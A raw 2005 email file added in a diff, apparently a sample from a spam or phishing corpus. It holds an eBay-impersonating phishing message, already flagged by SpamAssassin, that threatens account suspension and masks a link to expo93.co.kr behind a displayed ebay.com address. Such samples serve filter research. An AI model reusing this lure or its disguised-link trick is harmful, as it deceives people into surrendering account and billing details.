@@ -1,0 +1,72 @@
+Return-Path: <updamf@ebay.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+	by naughty.domain.com (Postfix) with ESMTP id C84DC536E98
+	for <username@login.domain.com>; Wed,  2 Nov 2005 08:49:41 -0500 (EST)
+Received: from mail2.domain.com (localhost.domain.com [127.0.0.1])
+	by mail2.domain.com (Postfix) with ESMTP id AF0BA6FA2B9
+	for <username@domain.com>; Wed,  2 Nov 2005 08:49:23 -0500 (EST)
+Received: from ebay.com (unknown [221.2.91.174])
+	by mail2.domain.com (Postfix) with SMTP
+	for <username@domain.com>; Wed,  2 Nov 2005 08:49:22 -0500 (EST)
+From: <updafn@ebay.com>
+To: <username@domain.com>
+Subject: Protect yourself from Spoof (fake) e-mailsrg
+Date: Wed, 2 Nov 2005 08:49:36 -0500
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ********
+X-Spam-Status: Yes, score=8.9 required=5.0 tests=HTML_10_20,HTML_MESSAGE,
+	HTML_MISSING_CTYPE,HTML_TEXT_AFTER_HTML,NO_REAL_NAME,
+	RCVD_IN_BL_SPAMCOP_NET,RCVD_IN_DSBL,RCVD_IN_XBL autolearn=no 
+	version=3.0.2
+X-Spam-Report: 
+	*  0.0 NO_REAL_NAME From: does not include a real name
+	*  0.0 HTML_TEXT_AFTER_HTML BODY: HTML contains text after HTML close tag
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.2 HTML_10_20 BODY: Message is 10% to 20% HTML
+	*  3.8 RCVD_IN_DSBL RBL: Received via a relay in list.dsbl.org
+	*      [<http://dsbl.org/listing?221.2.91.174>]
+	*  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+	*      [Blocked - see <http://www.spamcop.net/bl.shtml?221.2.91.174>]
+	*  3.1 RCVD_IN_XBL RBL: Received via a relay in Spamhaus XBL
+	*      [221.2.91.174 listed in sbl-xbl.spamhaus.org]
+	*  0.6 HTML_MISSING_CTYPE Message is HTML without HTML Content-Type
+Message-Id: <20051102134923.AF0BA6FA2B9@mail2.domain.com>
+X-Keywords:                  
+Status: RO
+Content-Length: 964
+Lines: 28
+
+
+<html>
+<br>Dear eBay Community Member,
+<br>It has come to our attention that your eBay billing informations are
+<br>out of order. If you could please take 5-10 minutes out of your
+<br>online experience and update your personal records you will not run 
+<br>into any future problems with the online service. However, failure 
+<br>to update your records will result in account suspension. Please 
+<br>update your records by November 10th.
+<br>
+<br>
+<br>Once you have updated your account records your eBay session will not 
+be
+<br>interrupted and will continue as normal. Failure to update will result in
+<br>cancellation of service, Terms of Service (TOS) violations or future
+<br>problems.
+<br>
+<br>To update your eBay records click here:
+<br><a HREF="http://expo93.co.kr/ws/ebayISAPI.dll/UPdate/index.html" 
+target="_self">http://cgi1.ebay.com/aw-cgi/ebayISAPI.dll?UPdate</a>
+<br>
+<br>Thank you for using eBay.
+<br>
+<br>Regards,
+<br>eBay Billing
+</html>
+
+gmqpwv
+
